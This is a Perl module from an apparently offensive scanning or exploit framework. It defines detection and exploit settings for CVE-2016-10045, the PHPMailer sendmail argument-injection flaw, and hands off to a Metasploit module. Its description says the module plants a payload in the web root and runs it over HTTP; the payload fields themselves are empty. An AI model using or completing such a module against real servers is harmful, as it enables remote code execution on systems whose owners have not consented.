package PHPMAILER::MSF::PhpmailerArgInjection;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "PhpmailerArgInjection";

   my $DETECTION = {
  METHOD => 'POST',
  PATH => '/',
  PAYLOAD => '',
  TEXT => 'Checking If : / Exists ...',
  VALIDATION   => {
    TCODE => ['200'],
  },
   };

my $EXPLOIT = {
  CVE => "CVE-2016-10045",
  DESCRIPTION => "

        PHPMailer versions up to and including 5.2.19 are affected by a

        vulnerability which can be leveraged by an attacker to write a file with

        partially controlled contents to an arbitrary location through injection

        of arguments that are passed to the sendmail binary. This module

        writes a payload to the web root of the webserver before then executing

        it with an HTTP request. The user running PHPMailer must have write

        access to the specified WEB_ROOT directory and successful exploitation

        can take a few minutes.

      ",
  MSF_MODULE => "phpmailer_arg_injection",
  PATHS => [""],
  REFERENCES => [
    "https://github.com/opsxcq/exploit-CVE-2016-10033",
    "https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html",
  ],
  TITLE => "PHPMailer Sendmail Argument Injection",
  VARIABLES => {
    'PATH' =>       { DESCRIPTION => "Path to the application root", VALUE => "/" },
    'TRIGGERURI' =>       { DESCRIPTION => "Path to the uploaded payload", VALUE => "" },
    'WEB_ROOT' =>       { DESCRIPTION => "Path to the web root", VALUE => "/var/www" },
  },

  TYPE => 'MSF',
  PLATFORM => 'MULTI',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => '',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #1 Request : [POST] /',
      HEADERS      => {
        'Content-Type' => 'multipart/form-data; boundary=_Part_563_3237892932_3477288497',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
